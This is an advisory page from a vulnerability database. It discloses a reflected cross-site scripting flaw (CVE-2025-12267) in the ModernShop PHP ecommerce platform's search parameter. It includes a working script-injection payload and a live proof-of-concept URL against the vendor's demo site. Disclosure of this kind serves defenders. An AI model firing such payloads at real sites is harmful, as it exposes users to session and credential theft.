---
title: ModernShop - RXSS
url: https://cxsecurity.com/issue/WLB-2025110006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-04
fetch_date: 2025-11-05T03:09:25.730704
---

# ModernShop - RXSS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ModernShop - RXSS** **2025.11.04**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-12267](https://cxsecurity.com/cveshow/CVE-2025-12267/ "Click to see CVE-2025-12267")**  CWE: **[CWE-79 - CWE-74 - CWE-707](https://cxsecurity.com/cwe/CWE-79%20-%20CWE-74%20-%20CWE-707 "Click to see CWE-79 - CWE-74 - CWE-707")** | |

# Exploit Title: ModernShop - RXSS
# Exploit Author: CraCkEr
# Date: 11-10-2025
# Author of Script: ABHIRAM B
# Vendor: ABHI CODE BOX
# Vendor Homepage: https://www.codester.com/items/comments/58847/modern-shop-php-ecommerce-platform
# Software Link: https://modernshop.apps.5g.in/
# Demo Link: https://modernshop.apps.5g.in/
# Tested on: Windows 11 Pro
# Impact: Manipulate the content of the site
# CWE: CWE-79 - CWE-74 - CWE-707
# VDP: VDB-329939
# CVE: CVE-2025-12267
## Description
Attacker can send to victim a link containing a malicious URL in an email or instant message
can perform a wide variety of actions, such as stealing the victim's session token or login credentials
Path:
/search
GET parameter 'q' is vulnerable to XSS
Live POC:
https://modernshop.apps.5g.in/search?q=1bwkni%3e%3cscript%3ealert(1)%3c%2fscript%3ehu1c6
Payload:
bwkni><script>alert(1)</script>hu1c6
[-] Done

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025110006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top